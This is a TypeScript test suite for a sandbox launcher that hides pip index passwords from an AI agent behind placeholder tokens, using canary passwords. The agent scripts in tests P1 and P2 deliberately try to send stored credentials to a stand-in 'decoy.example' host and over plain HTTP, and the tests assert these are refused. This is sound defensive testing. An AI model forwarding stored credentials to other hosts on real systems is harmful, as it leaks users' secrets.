/**
 * pip-wire-twin.test.ts — a private pip index whose password is in
 * `pip.conf` (or `PIP_INDEX_URL`) works under the real launcher, and the
 * password travels only to that index (plan 10 §11.13.1, 2026-10-03).
 *
 * Before: pip runs as `python3`, which is never a reader of `pip.conf` (Plan
 * 13 decision (b)), so it read the own-text twin, whose index URL held the
 * raw field symbol. Python's URL parser refuses the symbol's brackets in the
 * user information (3.14) or pip sent the symbol to the index (older), and
 * the index refused the login. Now the twin holds the PERCENT-ENCODED token,
 * pip decodes it and sends `Basic base64(user:<symbol>)`, and the session
 * proxy decodes the pair and puts the real password back at the index host
 * the HOME file's own URL names (the registration's binding).
 *
 * This suite runs the private arbiter in `secrets` and the real launcher
 * (twin binds, the guard, the egress proxy with TLS inspection) around a
 * shell agent in withStack's throwaway HOME. A fake HTTPS index for
 * `pypi.corp.example` (a PEP 503 page; 401 without the right Basic
 * credential) and a DECOY HTTPS host sit behind the session proxy's host
 * routes. The agent's client is pip's own credential path, written out in
 * the standard library (`PIP_CLIENT`: configparser, pip's split of the URL's
 * user information, `unquote`, Basic as requests builds it, the session's
 * HTTPS_PROXY and CA bundle), since CI's guest has no pip; where pip is
 * installed, `python3 -m pip index versions` runs too. Asserted:
 *   P1 a HOME `~/.config/pip/pip.conf`: python reads the twin (no password in
 *      it); the index answers the client (and pip) 200 and received the REAL
 *      password, only in its Authorization header; a workspace pip.conf's
 *      symbol (no binding: the agent can write it) is refused even at the
 *      index (403); the decoy, sent the HOME credential, answers nothing
 *      (403) and received nothing; no process holds a taint for pip.conf;
 *   P2 `PIP_INDEX_URL` in the launcher's environment: the agent's variable is
 *      the twin (percent-encoded token), the index gets the real password,
 *      the decoy nothing.
 * THE LEAK ORACLE in both: no form of a password in anything the agent saw.
 *
 * `--no-reply-filter` keeps stdout as the AGENT sees it. GATED on Linux +
 * bwrap + an unprivileged userns + openssl + python3 + the built guard; zero
 * API budget.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { createServer as createHttpsServer } from "node:https";
import { createServer as createHttpServer } from "node:http";
import { once } from "node:events";
import type { AddressInfo } from "node:net";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { spawnSync } from "node:child_process";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { withStack, runLauncher, probeKernelTier } from "../../lib/launcher-live.js";
import { installExitGuard } from "../../lib/exit-guard.js";
import { pickGuard } from "../../lib/native-guard.js";
import { stateAxes } from "../../lib/axes.js";
import { ProvenanceStore } from "../../../arbiter/provenance/provenance-store.js";
import { ensureCa, leafForHost, opensslAvailable } from "../../../interceptors/net-proxy/src/ca.js";

installExitGuard("pip-wire-twin");

// This suite STATES its axes (protection-modes.md §4): `secrets`.
stateAxes("secrets");

const HERE = dirname(fileURLToPath(import.meta.url));
const GUARD = pickGuard(resolve(HERE, "..", "..", "..", "interceptors", "target"));
const probe = process.platform === "linux" ? probeKernelTier() : null;
const hasPython = spawnSync("python3", ["--version"], { stdio: "ignore" }).status === 0;
const GATE = process.platform !== "linux"
  ? "Linux only (bwrap secret twins)"
  : !probe!.bwrap
    ? "`bwrap` not installed"
    : !probe!.userns
      ? "unprivileged user namespaces unavailable"
      : !GUARD.path
        ? "mandu-net-guard is not built (scripts/build-native.sh)"
        : !opensslAvailable()
          ? "openssl is not installed (the fake index's certificate)"
          : !hasPython
            ? "python3 is not installed"
            : false;

const PROJECT = "mandu-wire-fixture";
const CONF_PW = "pipCONFWIRECANARY_5b17e";
const ENV_PW = "pipENVWIRECANARY_8c2d0";
const WS_PW = "pipWSWIRECANARY_1f3a9";
const basic = (pair: string): string => `Basic ${Buffer.from(pair, "utf8").toString("base64")}`;

/** pip's credential path in the standard library: the index URL from a
 *  pip.conf (`conf <path>`) or from PIP_INDEX_URL (`env`), split as pip's
 *  `split_auth_from_netloc` does (rsplit at `@`, split at the first `:`,
 *  `unquote` both), Basic as requests' `_basic_auth_str` builds it (latin1),
 *  the request through HTTPS_PROXY with the default SSL context (the
 *  session's SSL_CERT_FILE). Prints `<tag> <status>`, and the symbol it sent
 *  as `<tag>_SYM` (a placeholder, never a password). */
const PIP_CLIENT = String.raw`
import base64, configparser, os, sys, urllib.error, urllib.parse, urllib.request
tag, how = sys.argv[1], sys.argv[2]
if how == "env":
    url = os.environ.get("PIP_INDEX_URL", "")
else:
    c = configparser.RawConfigParser()
    c.read(sys.argv[3])
    url = c.get("global", "index-url")
p = urllib.parse.urlsplit(url)
auth, _, host = p.netloc.rpartition("@")
user, _, pw = auth.partition(":")
user, pw = urllib.parse.unquote(user), urllib.parse.unquote(pw)
print(tag + "_SYM " + pw, flush=True)
target = sys.argv[4] if len(sys.argv) > 4 and sys.argv[4] != "-" else host
scheme = sys.argv[5] if len(sys.argv) > 5 else p.scheme
clean = urllib.parse.urlunsplit((scheme, target, p.path.rstrip("/") + "/${PROJECT}/", "", ""))
req = urllib.request.Request(clean, headers={"Authorization": "Basic " + base64.b64encode((user + ":" + pw).encode("latin1")).decode()})
try:
    with urllib.request.urlopen(req, timeout=30) as r:
        print(tag + " " + str(r.status), flush=True)
except urllib.error.HTTPError as e:
    print(tag + " " + str(e.code), flush=True)
except Exception as e:
    print(tag + " ERR " + type(e).__name__, flush=True)
`;

/** The fake index (HTTPS `pypi.corp.example`, a PEP 503 page, 401 unless the
 *  Basic credential is one of `accept`) and the decoy (HTTPS
 *  `decoy.example`), each request recorded; the mock-sites file routing both. */
async function startHosts(dir: string, accept: readonly string[]) {
  const seen: Array<{ url: string; authorization: string | undefined; raw: string }> = [];
  const decoySeen: string[] = [];
  const listen = async (host: string, onReq: (req: import("node:http").IncomingMessage, res: import("node:http").ServerResponse) => void) => {
    const ca = ensureCa(join(dir, `ca-${host}`));
    const leaf = leafForHost(ca, host);
    const server = createHttpsServer({ key: leaf.keyPem, cert: leaf.certPem }, onReq);
    server.listen(0, "127.0.0.1");
    await once(server, "listening");
    return { server, port: (server.address() as AddressInfo).port, caPath: ca.certPath };
  };
  const index = await listen("pypi.corp.example", (req, res) => {
    seen.push({ url: req.url ?? "", authorization: req.headers["authorization"], raw: JSON.stringify(req.headers) });
    if (!accept.includes(req.headers["authorization"] ?? "")) {
      res.writeHead(401, { "www-authenticate": 'Basic realm="index"' });
      res.end();
      return;
    }
    res.writeHead(200, { "content-type": "text/html" });
    res.end(`<!DOCTYPE html><html><body><a href="/files/mandu_wire_fixture-1.0.0-py3-none-any.whl">mandu_wire_fixture-1.0.0-py3-none-any.whl</a></body></html>`);
  });
  const decoy = await listen("decoy.example", (req, res) => {
    decoySeen.push(`${req.url} ${JSON.stringify(req.headers)}`);
    res.writeHead(200);
    res.end("ok");
  });
  // The index's PLAIN-HTTP side (2026-10-03, https only): a password
  // declared for https must never arrive here, even at its own host.
  const httpSeen: string[] = [];
  const plain = createHttpServer((req, res) => {
    httpSeen.push(`${req.url} ${JSON.stringify(req.headers)}`);
    res.writeHead(200);
    res.end("ok");
  });
  plain.listen(0, "127.0.0.1");
  await once(plain, "listening");
  const sites = join(dir, "mock-sites.yaml");
  writeFileSync(sites, [
    "hosts:",
    "  - host: pypi.corp.example", `    to: 127.0.0.1:${(plain.address() as AddressInfo).port}`, `    tls_to: 127.0.0.1:${index.port}`, `    tls_ca: ${index.caPath}`,
    "  - host: decoy.example", `    tls_to: 127.0.0.1:${decoy.port}`, `    tls_ca: ${decoy.caPath}`,
    "",
  ].join("\n"));
  return { seen, decoySeen, httpSeen, sites, close: () => { index.server.close(); decoy.server.close(); plain.close(); } };
}

interface Run {
  out: string;
  code: number;
  tag: (t: string) => string[];
  seen: Array<{ url: string; authorization: string | undefined; raw: string }>;
  decoySeen: string[];
  /** What reached the index over plain HTTP (the oracle: nothing). */
  httpSeen: string[];
  taints: string[];
}

/** One launch: the files written, the agent's script run, the records read. */
async function launch(opts: { files: Record<string, string>; script: (paths: { home: string; workspace: string; client: string }) => string; env?: Record<string, string>; accept: string[] }): Promise<Run> {
  let run: Run | undefined;
  // The labels name the files by pattern (withStack names its temp dirs):
  // the private arbiter's HOME is not the launch's (see npmrc-wire-twin).
  const policyDir = mkdtempSync(join(tmpdir(), "mdu-pip-policy-"));
  writeFileSync(join(policyDir, "policy.yaml"), [
    "version: 1",
    "paths:",
    '  - path: "**/home/.config/pip/pip.conf"',
    "    level: no-model",
    '  - path: "**/workspace/pip.conf"',
    "    level: no-model",
    "",
  ].join("\n"));
  await withStack(async ({ tmp, workspace, home, launcherEnv }) => {
    const hosts = await startHosts(tmp, opts.accept);
    try {
      for (const [rel, content] of Object.entries(opts.files)) {
        const p = rel.startsWith("workspace/") ? join(workspace, rel.slice(10)) : join(home, rel);
        mkdirSync(dirname(p), { recursive: true, mode: 0o700 });
        writeFileSync(p, content, { mode: 0o600 });
      }
      const client = join(tmp, "pip_client.py");
      writeFileSync(client, PIP_CLIENT);
      const script = join(tmp, "agent.sh");
      writeFileSync(script, `exec bash ${join(tmp, "work.sh")}\n`);
      writeFileSync(join(tmp, "work.sh"), opts.script({ home, workspace, client }));
      const env = { ...launcherEnv("https://127.0.0.1:1", 0), HOME: home, MANDU_NET_PROXY_MOCK_SITES: hosts.sites, ...(opts.env ?? {}) };
      const r = await runLauncher(
        ["--no-scope", "--no-mcp", "--no-reply-filter", "--target", "claude", "--", "/bin/sh", script],
        env, workspace, 240_000,
      );
      const store = new ProvenanceStore({ dbPath: join(tmp, "symbols.sqlite") });
      run = {
        out: r.out, code: r.code,
        tag: (t: string) => r.out.split("\n").filter((l) => l.startsWith(`${t} `)).map((l) => l.slice(t.length + 1)),
        seen: hosts.seen,
        decoySeen: hosts.decoySeen,
        httpSeen: hosts.httpSeen,
        taints: store.listSecretTaint(1000).filter((t) => t.path.endsWith("pip.conf")).map((t) => `${t.app}:${t.path}`),
      };
    } finally {
      hosts.close();
    }
  }, { mode: "secrets", policyPath: join(policyDir, "policy.yaml") });
  rmSync(policyDir, { recursive: true, force: true });
  return run!;
}

const scrub = (s: string): string => [CONF_PW, ENV_PW, WS_PW].reduce((acc, pw) => acc.split(pw).join("<CANARY>"), s);
const diagOf = (r: Run): string =>
  `\n--- index saw ---\n${r.seen.map((s) => `${s.url} auth=${s.authorization ?? "-"}`).join("\n")}` +
  `\n--- plain-HTTP to the index: ${r.httpSeen.length} arrived` +
  `\n--- decoy saw ---\n${r.decoySeen.length} request(s)\n--- taints ---\n${r.taints.join("\n")}` +
  `\n--- launch output (tail) ---\n${r.out.slice(-5000)}`;

/** Every form of a password the agent must never see. */
const forms = (pw: string, user = "builder"): string[] => [pw, encodeURIComponent(pw), basic(`${user}:${pw}`).slice(6)];

test("the guard under test is built from the current sources", { skip: process.platform !== "linux" || !GUARD.path }, () => {
  assert.equal(GUARD.stale, null, GUARD.stale ?? "");
});

test(
  "P1 LIVE: a HOME pip.conf's index password is the twin to python; the index gets the real password through the session proxy, a workspace pip.conf's symbol is refused, the decoy gets nothing; no taint, no canary",
  { skip: GATE, timeout: 300_000 },
  async () => {
    const r = await launch({
      files: {
        ".config/pip/pip.conf": `[global]\nindex-url = https://builder:${CONF_PW}@pypi.corp.example/simple\ntimeout = 30\n`,
        "workspace/pip.conf": `[global]\nindex-url = https://builder:${WS_PW}@pypi.corp.example/simple\n`,
      },
      accept: [basic(`builder:${CONF_PW}`)],
      script: ({ home, workspace, client }) => String.raw`
set -u
CONF="${home}/.config/pip/pip.conf"
python3 -c 'import sys; s=open(sys.argv[1]).read(); print("CONF_READ " + ("raw" if sys.argv[2] in s else ("twin" if "%24MDU%3A" in s else "other")))' "$CONF" "${CONF_PW}" 2>&1
python3 ${client} INDEX conf "$CONF" 2>&1
python3 ${client} WS conf "${workspace}/pip.conf" 2>&1
python3 ${client} DECOY conf "$CONF" decoy.example 2>&1
python3 ${client} HTTPBOUND conf "$CONF" - http 2>&1
if python3 -m pip --version >/dev/null 2>&1; then
  PIP_DISABLE_PIP_VERSION_CHECK=1 PIP_NO_INPUT=1 PIP_KEYRING_PROVIDER=disabled PIP_NO_CACHE_DIR=1 python3 -m pip index versions ${PROJECT} 2>&1 | /usr/bin/sed 's/^/PIP /'
else
  echo "PIP_ABSENT"
fi
echo "AGENT_DONE"
`,
    });
    const diag = scrub(diagOf(r));
    assert.equal(r.code, 0, `the launch failed${diag}`);
    assert.ok(r.out.includes("AGENT_DONE"), `the agent's script did not finish${diag}`);
    assert.ok(/net-guard LIVE/.test(r.out), `the guard engaged${diag}`);
    // THE LEAK ORACLE first.
    for (const f of [...forms(CONF_PW), ...forms(WS_PW)]) assert.ok(!r.out.includes(f), `a form of a canary reached the agent's world${diag}`);
    // python read the twin: a percent-encoded token in the URL.
    assert.deepEqual(r.tag("CONF_READ"), ["twin"], diag);
    assert.match(r.tag("INDEX_SYM")[0] ?? "", /^\$MDU:nomodel_Read\[[0-9a-f]+\]\./, `pip decodes the twin into the symbol${diag}`);
    // The index got the real password (the proxy put it back), only there.
    assert.deepEqual(r.tag("INDEX"), ["200"], `the index refused the client${diag}`);
    const good = r.seen.filter((s) => s.authorization === basic(`builder:${CONF_PW}`));
    assert.ok(good.length >= 1, `the index never got the real password${diag}`);
    for (const s of r.seen) assert.ok(!s.raw.includes(CONF_PW), `the password rode outside the Basic header${diag}`);
    // The workspace pip.conf's symbol is bound nowhere: refused before the index.
    assert.deepEqual(r.tag("WS"), ["403"], `the workspace symbol${diag}`);
    assert.ok(!r.seen.some((s) => (s.authorization ?? "").includes(Buffer.from(`builder:${WS_PW}`).toString("base64"))), `the workspace password reached the index${diag}`);
    // The decoy: refused, and nothing reached it.
    assert.deepEqual(r.tag("DECOY"), ["403"], `the decoy request${diag}`);
    assert.deepEqual(r.decoySeen, [], `the decoy received a request${diag}`);
    // HTTPS ONLY (2026-10-03): the same credential in plain HTTP to the index
    // ITSELF is refused, and its plain side receives nothing.
    assert.deepEqual(r.tag("HTTPBOUND"), ["403"], `the plain-HTTP request to the index${diag}`);
    assert.deepEqual(r.httpSeen, [], `the index received a plain-HTTP request${diag}`);
    // Every request that reached the index carried the real credential (the
    // workspace one never got there).
    assert.equal(good.length, r.seen.length, `a request with another credential reached the index${diag}`);
    // No taint for pip.conf: python never held a raw byte.
    assert.deepEqual(r.taints, [], `a process of the session holds pip.conf${diag}`);
    // The real pip, where installed.
    if (!r.out.includes("PIP_ABSENT")) {
      assert.ok(r.tag("PIP").some((l) => l.includes(`${PROJECT} (1.0.0)`)), `pip index versions${diag}`);
    } else {
      console.error("pip-wire-twin: pip is not installed; PIP_CLIENT (pip's credential path in the standard library) stands for it");
    }
  },
);

test(
  "P2 LIVE: PIP_INDEX_URL in the launcher's environment: the agent's variable is the twin, the index gets the real password through the session proxy, the decoy gets nothing; no canary",
  { skip: GATE, timeout: 300_000 },
  async () => {
    const r = await launch({
      files: {},
      env: { PIP_INDEX_URL: `https://builder:${ENV_PW}@pypi.corp.example/simple` },
      accept: [basic(`builder:${ENV_PW}`)],
      script: ({ client }) => String.raw`
set -u
case "$PIP_INDEX_URL" in *"${ENV_PW}"*) echo "ENV_READ raw" ;; *%24MDU%3A*) echo "ENV_READ twin" ;; *) echo "ENV_READ other" ;; esac
python3 ${client} INDEX env 2>&1
python3 ${client} DECOY env - decoy.example 2>&1
python3 ${client} HTTPBOUND env - - http 2>&1
echo "AGENT_DONE"
`,
    });
    const diag = scrub(diagOf(r));
    assert.equal(r.code, 0, `the launch failed${diag}`);
    assert.ok(r.out.includes("AGENT_DONE"), `the agent's script did not finish${diag}`);
    for (const f of forms(ENV_PW)) assert.ok(!r.out.includes(f), `a form of the canary reached the agent's world${diag}`);
    assert.deepEqual(r.tag("ENV_READ"), ["twin"], diag);
    assert.deepEqual(r.tag("INDEX"), ["200"], `the index refused the client${diag}`);
    assert.ok(r.seen.length >= 1 && r.seen.every((s) => s.authorization === basic(`builder:${ENV_PW}`)), `the index got the real password, and only it${diag}`);
    assert.deepEqual(r.tag("DECOY"), ["403"], `the decoy request${diag}`);
    assert.deepEqual(r.decoySeen, [], `the decoy received a request${diag}`);
    // HTTPS ONLY (2026-10-03): the same credential in plain HTTP to the index
    // ITSELF is refused, and its plain side receives nothing.
    assert.deepEqual(r.tag("HTTPBOUND"), ["403"], `the plain-HTTP request to the index${diag}`);
    assert.deepEqual(r.httpSeen, [], `the index received a plain-HTTP request${diag}`);
  },
);
